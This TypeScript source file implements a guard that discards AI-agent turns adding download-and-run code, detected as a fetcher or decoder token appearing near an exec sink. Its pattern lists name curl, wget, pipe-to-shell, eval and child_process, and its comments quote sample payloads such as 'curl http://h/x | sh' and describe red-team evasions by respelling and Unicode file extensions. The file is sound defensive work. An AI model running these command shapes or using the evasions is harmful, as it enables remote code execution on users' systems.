import type { RuleHit } from "../policy-types.js";
import type { Rule } from "./rule.js";
import { classifyPath } from "../effect-classifier.js";
import { normaliseText } from "./normalise.js";
import { decodeCandidates, foldAdjacentLiterals } from "./decode.js";
import { scanTargets } from "./scan-targets.js";

/**
 * Download-and-run, detected as a co-occurrence rather than as an idiom.
 *
 * The shipped policy carried three literal shapes (`curl | sh`, `wget | sh`, `eval(atob`). Five
 * red-team payloads walked past them by changing the spelling and nothing else: an aliased eval,
 * command substitution instead of a pipe, a pipe into python3, `new Function` instead of `eval`,
 * and `https.get` with the exec in a callback. What all of them share is not a string, it is a
 * pair: something that brings bytes in, and something that runs bytes, close together.
 *
 * So the rule is the pair. A source token (a fetcher, or a decoder, because decoding is the other
 * way untrusted bytes become code) and a sink token inside one added hunk, in either order.
 *
 * ## Where the pair alone is not enough, and what replaces it
 *
 * Co-occurrence over the RAW text was the whole test, and it discards, which destroys the turn's
 * work. Measured over 277 real source files from the four vendored repositories, two would have
 * been discarded had an agent written them, and in three of the four findings between them the
 * sink token was never code:
 *
 *     express/test/res.redirect.js:114     `eval` inside the string literal that IS the XSS
 *                                          payload the test defends against
 *     click/src/click/_termui_impl.py:420  `subprocess.` inside the URL inside the docstring that
 *                                          cites the subprocess documentation
 *
 * express is now committed and click is not. click carries a SECOND pair that the precision
 * harness never printed, because it reports only the first finding per file, and that one is two
 * pieces of live code fifteen lines apart: a real `subprocess.call(args)` and a real
 * `url.startswith(("http://", "https://"))`. Nothing here reaches it. The count of real files this
 * rule would discard goes 2 -> 1 and the count of findings goes 3 -> 2.
 *
 * Two questions this rule now asks before it discards, both of them about the sink:
 *
 *   1. IS THE SINK CODE? A language construct (`eval`, `new Function`, `exec(`, `subprocess.`)
 *      written inside a string literal or a docstring is text, not an evaluation. So in a language
 *      whose string literals are inert data, those sinks are matched against the source with its
 *      literals blanked out. A shell command line is NOT a language construct and keeps matching
 *      the raw text everywhere, because `"curl http://h/x | sh"` inside a quoted string is still
 *      the command something later hands to a shell. That distinction is the whole reason the
 *      manifest cases survive: in `package.json`, `pyproject.toml` and a CI workflow the string
 *      literal IS the executable content, and every one of those carries a shell command line.
 *
 *   2. COULD THE FETCHED VALUE REACH IT? `new Function("return 1")` runs a constant. Whatever the
 *      hunk fetched, it is not what that call evaluates. So when the operand of a language-
 *      construct sink is visible AND is entirely constant, there is no flow and no finding. When
 *      the operand is not visible (an aliased `eval`, a bare `subprocess.`) the question cannot be
 *      answered and the pair stands, which is the co-occurrence behaviour this rule started with.
 *
 * Both questions are asked ONLY of files whose language treats a string literal as inert data and
 * whose class is ordinary source or test. Everywhere else, and for every shell command line
 * anywhere, the rule is unchanged co-occurrence. See INERT_LITERAL_EXTENSIONS and
 * hasInertLiterals for exactly where the line is drawn, and net-to-exec.test.ts for what is
 * knowingly left uncovered.
 */

export const REMOTE_EXEC_RULE = "remote-code-execution-added";

/** One added hunk: five lines, extended until it holds 400 characters, capped so it stays local. */
const WINDOW_LINES = 5;
const WINDOW_CHARS = 400;
const MAX_WINDOW_LINES = 40;
const MAX_LINES = 5000;

/** Prose that documents `curl | sh` is not a turn that runs it. */
const PROSE_PATH = /\.(?:md|markdown|mdx|rst|txt|adoc|org)$/i;

interface Token {
  name: string;
  pattern: RegExp;
  /**
   * A weak token is one whose presence alone says almost nothing, because ordinary code is full of
   * it. A weak SOURCE is only counted on a line that is code: a URL in a licence header is not a
   * fetch, and the corpus measured that exact shape hard-discarding 97 benign turns, most of them
   * Go files carrying an Apache header. Strong tokens still count anywhere in the hunk.
   */
  weak?: boolean;
}

/** A line whose content is entirely a comment, in the comment syntaxes source files actually use. */
const COMMENT_LINE = /^\s*(?:\/\/|#|\*|\/\*|--|;|<!--)/;

/** Brings remote bytes in, or turns opaque bytes back into text. Either is an untrusted source. */
export const SOURCE_TOKENS: Token[] = [
  { name: "curl", pattern: /\bcurl\b/ },
  { name: "wget", pattern: /\bwget\b/ },
  { name: "fetch(", pattern: /\bfetch\s*\(/ },
  { name: "http.get", pattern: /\bhttps?\.(?:get|request)\s*\(/ },
  { name: "axios", pattern: /\baxios\b/ },
  { name: "got(", pattern: /\bgot\s*\(/ },
  { name: "urllib", pattern: /\burllib(?:2|\.request)?\b/ },
  { name: "requests", pattern: /\brequests\.(?:get|post|request)\s*\(/ },
  { name: "Invoke-WebRequest", pattern: /\bInvoke-(?:WebRequest|RestMethod)\b/i },
  { name: "iwr", pattern: /\biwr\b/i },
  { name: "XMLHttpRequest", pattern: /\bXMLHttpRequest\b/ },
  { name: "http-literal", pattern: /\bhttps?:\/\//, weak: true },
  { name: "atob", pattern: /\batob\s*\(/ },
  { name: "Buffer.from base64", pattern: /Buffer\.from\s*\([^)]*base64/ },
  { name: "base64 -d", pattern: /\bbase64\s+(?:-d\b|--decode\b|-D\b)/ },
  { name: "b64decode", pattern: /\bbase64\.b64decode\s*\(/ },
  { name: "unhexlify", pattern: /\bbinascii\.unhexlify\s*\(/ },
  { name: "codecs.decode", pattern: /\bcodecs\.decode\s*\(/ },
  { name: "zlib.decompress", pattern: /\bzlib\.decompress\s*\(/ },
];

interface Sink extends Token {
  /**
   * This token means what it says even inside a string literal, because something later READS
   * that string.
   *
   * Two kinds qualify. A shell command line: `curl http://h/x | sh` is executable content wherever
   * it is written, in a Makefile recipe, in a `postinstall` value in package.json, in a `run:`
   * step in a workflow, in a `build-backend` value in pyproject.toml, and inside a quoted string
   * in JavaScript that something hands to a shell. And a module specifier: `require("child_process")`
   * writes the module name inside a literal ALWAYS, and the loader resolves it, so blanking
   * literals would delete that token from every JavaScript file rather than make it more precise.
   * The sweep in net-to-exec.test.ts caught exactly that: the token went silent on
   * `require("child_process")` before this flag covered it.
   *
   * 1,296 of the 1,519 corpus detections this rule makes land on one of these, 1,105 of them on
   * `pipe-to-shell` alone, and that includes every manifest detection.
   *
   * `eval`, by contrast, only evaluates when it is evaluated. Written inside a string literal in a
   * language whose literals are inert, it is text.
   */
  literalIsLive?: boolean;
}

/** Runs whatever it is handed. */
export const SINK_TOKENS: Sink[] = [
  { name: "pipe-to-shell", pattern: /\|\s*(?:ba|z|da|k|fi|a)?sh\b/, literalIsLive: true },
  { name: "pipe-to-python", pattern: /\|\s*python[0-9.]*\b/, literalIsLive: true },
  { name: "pipe-to-node", pattern: /\|\s*node\b/, literalIsLive: true },
  { name: "pipe-to-interpreter", pattern: /\|\s*(?:ruby|perl|php|Rscript)\b/, literalIsLive: true },
  { name: "command-substitution", pattern: /\$\(\s*(?:[^()]{0,80}\s)?(?:curl|wget|iwr|Invoke-WebRequest|https?:)/i, literalIsLive: true },
  { name: "backtick-substitution", pattern: /`[^`]{0,200}?\b(?:curl|wget|iwr|Invoke-WebRequest)\b/i, literalIsLive: true },
  { name: "eval", pattern: /\beval\b/ },
  { name: "new Function(", pattern: /\bnew\s+Function\s*\(/ },
  { name: "Function(", pattern: /\bFunction\s*\(/ },
  { name: "vm.run", pattern: /\bvm\.run[A-Za-z]*\s*\(/ },
  // No space before the paren. `import (` with a space is Go's import block and Python's
  // parenthesised from-import, both of which are declarations rather than a way to run bytes;
  // a JavaScript dynamic import is written `import(`. The spaced spelling paired with a URL in a
  // licence header was the single largest false-abort class the benign corpus found.
  { name: "dynamic import(", pattern: /\bimport\(/ },
  { name: "timer-with-string", pattern: /\bset(?:Timeout|Interval)\s*\(\s*["'`]/ },
  { name: "exec(", pattern: /\bexec\s*\(/ },
  { name: "execSync(", pattern: /\bexecSync\s*\(/ },
  { name: "execFile(", pattern: /\bexecFile(?:Sync)?\s*\(/ },
  { name: "spawn(", pattern: /\bspawn(?:Sync)?\s*\(/ },
  { name: "os.system(", pattern: /\bos\.system\s*\(/ },
  { name: "subprocess.", pattern: /\bsubprocess\./ },
  { name: "child_process", pattern: /\bchild_process\b/, literalIsLive: true },
  { name: "process-substitution", pattern: /(?:^|\s)(?:source|\.)\s+<\(/m, literalIsLive: true },
  { name: "node -e", pattern: /\bnode\s+-e\b/, literalIsLive: true },
  { name: "python -c", pattern: /\bpython[0-9.]*\s+-c\b/, literalIsLive: true },
  { name: "shell -c", pattern: /\b(?:ba|z|da|k)?sh\s+-c\b/, literalIsLive: true },
  { name: "Invoke-Expression", pattern: /\b(?:Invoke-Expression|IEX)\b/i, literalIsLive: true },
  { name: "system(", pattern: /\bsystem\s*\(/ },
  { name: "popen(", pattern: /\bpopen\s*\(/ },
];

/**
 * Extensions whose language treats a string literal as inert data.
 *
 * Deliberately NOT here: `.sh`, `.bash`, `.zsh`, because `"$(curl http://h/x)"` inside double
 * quotes is a command substitution the shell runs; `.yml`, `.yaml`, `.json`, `.toml`, `.xml`, and
 * every extension nobody listed, because a runner reads those strings as the thing to do.
 *
 * Matched on the extension LOWERCASED AND NOTHING ELSE. `.JS` is JavaScript; `.jѕ` with a Cyrillic
 * es is not, and neither is `.ｐｙ` in fullwidth. Those spellings are the exec-surface-enumeration
 * family's whole technique, and 528 of this rule's 1,519 corpus detections are on a path that is
 * not pure ASCII. Refusing to normalise the extension means an unrecognised spelling gets the
 * STRICTER treatment, raw co-occurrence exactly as before, so the evasion buys the attacker
 * nothing. Every other path matcher in this repository normalises before matching; this one must
 * not, and that is why.
 */
const INERT_LITERAL_EXTENSIONS: ReadonlySet<string> = new Set([
  ".js", ".jsx", ".mjs", ".cjs", ".ts", ".tsx", ".mts", ".cts",
  ".py", ".go", ".rs", ".rb", ".php", ".swift",
  ".java", ".kt", ".scala", ".cs",
  ".c", ".h", ".cc", ".cpp", ".hpp",
]);

/**
 * Languages that carry a triple-quoted string. Python only, among the extensions above.
 *
 * `.pyi` is deliberately absent from this set and from INERT_LITERAL_EXTENSIONS: `classifyPath` has no `.pyi` in its source
 * extensions, so a stub file is class `other` and never reaches the inert path anyway. Listing it
 * would have claimed coverage the class gate then refused to give.
 */
const TRIPLE_QUOTE_EXTENSIONS: ReadonlySet<string> = new Set([".py"]);

/**
 * Languages that carry a multi-line backtick string: a JavaScript template literal, whose `${...}`
 * holes are live code, and a Go raw string, where `${` is ordinary text. The hole tracking runs for
 * both, so a Go raw string containing `${` stops being blanked early. That direction leaves MORE
 * text visible to the sink match, never less, which is the safe side for a rule that discards.
 */
const BACKTICK_EXTENSIONS: ReadonlySet<string> = new Set([
  ".js", ".jsx", ".mjs", ".cjs", ".ts", ".tsx", ".mts", ".cts", ".go",
]);

/**
 * Classes whose contents are ordinary program text rather than something a runner executes.
 *
 * `classifyPath` claims `setup.py`, `conftest.py`, `noxfile.py`, `sitecustomize.py`, `build.rs`,
 * `vite.config.ts` and `.eslintrc.js` for the exec-surface classes before `source` ever gets them,
 * and every one of those is a file whose strings a tool may run. They keep raw co-occurrence.
 */
const LITERAL_INERT_CLASSES: ReadonlySet<string> = new Set(["source", "test"]);

function extensionOf(path: string): string {
  const base = path.replace(/\\/g, "/").split("/").pop() ?? "";
  const dot = base.lastIndexOf(".");
  return dot <= 0 ? "" : base.slice(dot).toLowerCase();
}

/**
 * True when a string literal in this file is data at rest, so a language construct written inside
 * one is text rather than an evaluation. Both halves must agree: the language, by extension, and
 * the class, by `classifyPath`.
 */
function hasInertLiterals(path: string): boolean {
  const ext = extensionOf(path);
  if (!INERT_LITERAL_EXTENSIONS.has(ext)) return false;
  return LITERAL_INERT_CLASSES.has(classifyPath(path));
}

/** How much of one line the literal blanker will walk. Bounded, like every scan in this directory. */
const MAX_BLANK_CHARS = 20_000;

const SINGLE_LINE_LITERAL = /(["'])(?:\\.|(?!\1)[^\\\n])*\1/g;

/** Same width, so a column never moves and a finding still names the line it came from. */
const blanked = (text: string): string => " ".repeat(text.length);

/**
 * Replaces the CONTENT of every string literal with spaces, keeping the delimiters, the line count
 * and every column.
 *
 * Two walks, because the constructs have different reach: one across the array for the delimiters
 * that span lines, then one regex per line for the ones that do not.
 *
 *  - A triple-quoted Python string spans lines, so it is walked across the array. A docstring is
 *    the click false positive in full: a URL and the word `subprocess.` inside `"""..."""`.
 *  - A backtick string spans lines too, and in JavaScript its `${...}` holes are LIVE CODE, so
 *    those are left alone. `` `${eval(payload)}` `` still reads as an eval.
 *  - A `'...'` or `"..."` literal is blanked only when it OPENS AND CLOSES ON ONE LINE. An
 *    apostrophe in `# don't do this` would otherwise open a string that swallows the rest of the
 *    file, which would silently delete detections rather than false positives.
 *
 * Known gaps, measured and accepted (see net-to-exec.test.ts): Ruby `#{...}` interpolation is
 * blanked with the string around it, and a Rust `r#"..."#` raw string is blanked only when it
 * closes on its own line.
 */
function blankStringLiterals(lines: string[], ext: string): string[] {
  const triple = TRIPLE_QUOTE_EXTENSIONS.has(ext);
  const backtick = BACKTICK_EXTENSIONS.has(ext);
  const out: string[] = [];
  /** the delimiter of the multi-line region we are inside, or null */
  let open: string | null = null;
  /** depth of `${` holes inside the backtick region we are inside; holes are live code */
  let hole = 0;

  for (const raw of lines) {
    const line = raw.length > MAX_BLANK_CHARS ? raw.slice(0, MAX_BLANK_CHARS) : raw;
    let result = "";
    let i = 0;
    while (i < line.length) {
      if (open !== null) {
        if (hole > 0) {
          // inside `${ ... }`: live code, copied through, closing on the matching brace
          const ch = line[i] ?? "";
          if (ch === "{") hole += 1;
          else if (ch === "}") hole -= 1;
          result += ch;
          i += 1;
          continue;
        }
        if (open === "`" && line.startsWith("${", i)) {
          hole = 1;
          result += "${";
          i += 2;
          continue;
        }
        if (line.startsWith(open, i)) {
          result += open;
          i += open.length;
          open = null;
          continue;
        }
        result += " ";
        i += 1;
        continue;
      }
      if (triple && (line.startsWith('"""', i) || line.startsWith("'''", i))) {
        open = line.slice(i, i + 3);
        result += open;
        i += 3;
        continue;
      }
      if (backtick && line[i] === "`") {
        open = "`";
        result += "`";
        i += 1;
        continue;
      }
      result += line[i] ?? "";
      i += 1;
    }
    if (raw.length > MAX_BLANK_CHARS) result += raw.slice(MAX_BLANK_CHARS);
    // A `'...'` or `"..."` that opens and closes on this line, outside any multi-line region.
    out.push(result.replace(SINGLE_LINE_LITERAL, (m) => m[0] + blanked(m.slice(1, -1)) + m[m.length - 1]));
  }
  return out;
}

export interface NetToExecFinding {
  path: string;
  /** 1-based first line of the hunk that held both halves */
  line: number;
  source: string;
  sink: string;
}

/** Windows of added lines: five lines, grown until the window holds 400 characters. */
export function hunksOf(lines: string[]): Array<{ line: number; text: string; end: number }> {
  const hunks: Array<{ line: number; text: string; end: number }> = [];
  for (let start = 0; start < lines.length; start += 1) {
    let end = Math.min(lines.length, start + WINDOW_LINES);
    let text = lines.slice(start, end).join("\n");
    while (text.length < WINDOW_CHARS && end < lines.length && end - start < MAX_WINDOW_LINES) {
      end += 1;
      text = lines.slice(start, end).join("\n");
    }
    hunks.push({ line: start + 1, text, end });
  }
  return hunks;
}

function firstMatch(tokens: Token[], text: string, codeOnly?: string): string | null {
  for (const token of tokens) {
    const against = token.weak && codeOnly !== undefined ? codeOnly : text;
    if (token.pattern.test(against)) return token.name;
  }
  return null;
}

/** Longest operand this reads before giving up and calling the answer unknown. */
const MAX_OPERAND_CHARS = 600;

/**
 * The half-open span of the parenthesised operand belonging to a sink matched at [start, end), or
 * null when there is not one.
 *
 * Null means "the question cannot be answered here", not "there is no operand": an aliased `eval`
 * assigned to a name, a bare `subprocess.PIPE`, an operand longer than the budget, an unclosed
 * paren at the end of the hunk. Every one of those keeps the pair, which is the co-occurrence
 * behaviour this rule started with.
 *
 * The opening paren is found in one of two places and BOTH are needed. Most sink patterns end at
 * the paren themselves (`\bexec\s*\(`), one ends past it (`timer-with-string` reads on to the
 * opening quote), and two do not have one at all (`eval`, `subprocess.`). Looking only after the
 * match, which is what the first version of this did, made every already-consumed paren invisible
 * and `new Function("return 1")` read as unanswerable rather than as constant. The sweep in
 * net-to-exec.test.ts is what caught it.
 */
function operandSpan(text: string, start: number, end: number): [number, number] | null {
  const inMatch = text.indexOf("(", start);
  let open: number;
  if (inMatch >= start && inMatch < end) {
    open = inMatch;
  } else {
    let i = end;
    while (i < text.length && /[A-Za-z0-9_$.]/.test(text[i] ?? "")) i += 1;
    while (i < text.length && /\s/.test(text[i] ?? "")) i += 1;
    if (text[i] !== "(") return null;
    open = i;
  }
  let depth = 0;
  for (let i = open; i < text.length && i - open <= MAX_OPERAND_CHARS; i += 1) {
    const ch = text[i];
    if (ch === "(") depth += 1;
    else if (ch === ")") {
      depth -= 1;
      if (depth === 0) return [open + 1, i];
    }
  }
  return null;
}

const CONSTANT_WORDS: ReadonlySet<string> = new Set(["true", "false", "null", "none", "undefined", "nil"]);

/**
 * True when nothing in this operand can carry a value from elsewhere in the hunk.
 *
 * The operand has already had its string literals blanked, so what is left of `"http://h/x"` is
 * two quotes and some spaces. Anything that could name or compute a value, an identifier, a
 * property access, a template hole, disqualifies it. Numbers, `true`, `false`, `null`, `None` and
 * punctuation do not: `new Function("return 1", 2)` runs a constant just as surely.
 */
function operandIsConstant(operand: string): boolean {
  const words = operand.match(/[A-Za-z_$][A-Za-z0-9_$]*/g) ?? [];
  return words.every((word) => CONSTANT_WORDS.has(word.toLowerCase()));
}

/**
 * True when the constant this sink runs is ITSELF a way to fetch and run bytes.
 *
 * `execSync("curl http://h/x -o /tmp/p && /tmp/p")` has a constant operand, so the first half of
 * the flow test says the fetched value cannot reach it. That is true and beside the point: the
 * constant is the download-and-run. So a constant operand only clears a sink when the operand,
 * and anything one decoding step recovers from it, carries no source token either. Without this
 * the change would have opened a hole where a payload written as one constant string walked past
 * a rule that used to catch it, in exchange for precision nobody asked for.
 */
function operandCarriesSource(rawOperand: string): boolean {
  if (firstMatch(SOURCE_TOKENS, rawOperand) !== null) return true;
  const decoded = decodeCandidates(rawOperand).map((candidate) => candidate.text).join(" ");
  return decoded.length > 0 && firstMatch(SOURCE_TOKENS, decoded) !== null;
}

/**
 * The first sink in this hunk that is really a sink.
 *
 * `raw` is the hunk as written, plus whatever a speculative decode recovered. `live` and `folded`
 * are the same window WITHOUT the decoded tail, so they share every column: `live` has its string
 * literals and whole-comment lines blanked, `folded` does not. That alignment is what lets a span
 * found in `live` be read back out of `folded`.
 *
 * When the file's language does not have inert literals, `inert` is false and every sink is tested
 * against `raw` exactly as before, so nothing about a shell script, a manifest, a workflow, a
 * Dockerfile or an unrecognised extension changes.
 */
function findSink(raw: string, live: string, folded: string, inert: boolean): string | null {
  for (const sink of SINK_TOKENS) {
    if (sink.literalIsLive === true || !inert) {
      if (sink.pattern.test(raw)) return sink.name;
      continue;
    }
    const pattern = new RegExp(sink.pattern.source, `${sink.pattern.flags.replace(/[gy]/g, "")}g`);
    for (const match of live.matchAll(pattern)) {
      const at = match.index ?? 0;
      const span = operandSpan(live, at, at + match[0].length);
      if (span === null) return sink.name;
      if (!operandIsConstant(live.slice(span[0], span[1]))) return sink.name;
      if (operandCarriesSource(folded.slice(span[0], span[1]))) return sink.name;
    }
  }
  return null;
}

/**
 * Pure. Returns at most one finding per hunk, naming both halves of the pair, so a reviewer sees
 * why the turn was refused rather than being told a regex matched.
 */
export function findNetToExec(added: string, path: string): NetToExecFinding[] {
  if (PROSE_PATH.test(path)) return [];
  const rawLines = added.split("\n").slice(0, MAX_LINES);
  const folded = rawLines.map((line) => foldAdjacentLiterals(normaliseText(line)));
  const lines = folded.map((line) => {
    const decoded = decodeCandidates(line).map((candidate) => candidate.text).join(" ");
    return decoded.length > 0 ? `${line} ${decoded}` : line;
  });
  const inert = hasInertLiterals(path);
  // The live view is built from the folded lines WITHOUT the decoded tail. A payload recovered by
  // speculative decoding came out of a literal, so in a language with inert literals it is data
  // for the same reason the literal was; the SOURCE half still reads the decoded text, which is
  // what keeps `exec(atob("<base64 of curl | sh>"))` a finding.
  //
  // A whole-comment line is blanked rather than dropped, so the live view keeps the column of
  // every character in `folded` and a span found in one can be read out of the other.
  const liveLines = inert
    ? blankStringLiterals(folded, extensionOf(path)).map((line, i) =>
      (COMMENT_LINE.test(folded[i] ?? "") ? " ".repeat(line.length) : line))
    : lines;

  const findings: NetToExecFinding[] = [];
  const reported = new Set<string>();
  for (const hunk of hunksOf(lines)) {
    const code = hunk.text
      .split("\n")
      .filter((line) => !COMMENT_LINE.test(line))
      .join("\n");
    const source = firstMatch(SOURCE_TOKENS, hunk.text, code);
    if (source === null) continue;
    const live = inert ? liveLines.slice(hunk.line - 1, hunk.end).join("\n") : hunk.text;
    const window = inert ? folded.slice(hunk.line - 1, hunk.end).join("\n") : hunk.text;
    const sink = findSink(hunk.text, live, window, inert);
    if (sink === null) continue;
    const key = `${source}|${sink}`;
    if (reported.has(key)) continue;
    reported.add(key);
    findings.push({ path, line: hunk.line, source, sink });
  }
  return findings;
}

export const rule: Rule = {
  name: REMOTE_EXEC_RULE,
  summary:
    "A token that brings bytes in and a token that runs bytes, occurring together in one added hunk, with string literals blanked first so an eval inside a fixture is not a sink.",
  decisions: ["discard"],
  hitIds: ["remote-code-execution-added"],
  async run(effects, ctx) {
    const targets = await scanTargets(effects, ctx);
    const hits: RuleHit[] = [];
    for (const target of targets) {
      for (const found of findNetToExec(target.added, target.path)) {
        hits.push({
          rule: REMOTE_EXEC_RULE,
          decision: "discard",
          path: found.path,
          detail: `${found.source} reaches ${found.sink} within one added hunk at line ${found.line}`,
        });
      }
    }
    return hits;
  },
};
